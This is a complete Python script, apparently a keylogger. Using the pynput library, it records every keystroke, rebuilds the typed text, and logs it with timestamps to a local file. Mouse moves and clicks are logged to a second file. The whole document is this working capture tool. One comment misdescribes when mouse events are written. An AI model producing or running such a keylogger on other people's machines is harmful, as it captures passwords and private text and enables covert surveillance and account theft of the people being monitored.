from datetime import datetime
import pynput

# Define constants
KEY_LOG_FILE = "key_log.txt"
MOUSE_LOG_FILE = "mouse_log.txt"
MAX_KEYS = 10

# Initialize key counter and list of keys
key_count = 0
key_list = []

# Initialize mouse listener and list of mouse events
mouse_list = []

# Define keyboard event callbacks


def on_press(key):
    global key_count, key_list

    # Append key to list and increment counter
    key_list.append(key)
    key_count += 1

    # Write keys to file if count threshold is reached
    if key_count >= MAX_KEYS:
        write_key_file(key_list)
        key_list = []
        key_count = 0


def write_key_file(keys):
    with open(KEY_LOG_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        f.write(f"\n\n{date_time}\n")
        words = []
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.enter":
                f.write("".join(words) + "\n")
                words = []
            elif k == "Key.space":
                words.append(" ")
            elif k.find("Key") == -1:
                words.append(k)
        f.write("".join(words))


def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop mouse listener and exit keyboard listener
        mouse_listener.stop()
        return False

# Define mouse event callbacks


def on_move(x, y):
    global mouse_list
    mouse_list.append(f"Moved to ({x}, {y})")


def on_click(x, y, button, pressed):
    global mouse_list
    mouse_list.append(
        f"{button} {'pressed' if pressed else 'released'} at ({x}, {y})")

    # Write mouse events to file if escape button is pressed
    if not pressed and button == pynput.mouse.Button.left:
        write_mouse_file(mouse_list)
        mouse_list = []


def write_mouse_file(mouse_events):
    with open(MOUSE_LOG_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        f.write(f"\n\n{date_time}\n")
        for event in mouse_events:
            f.write(event + "\n")


# Start listeners
mouse_listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
mouse_listener.start()

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener:
    key_listener.join()
    mouse_listener.join()
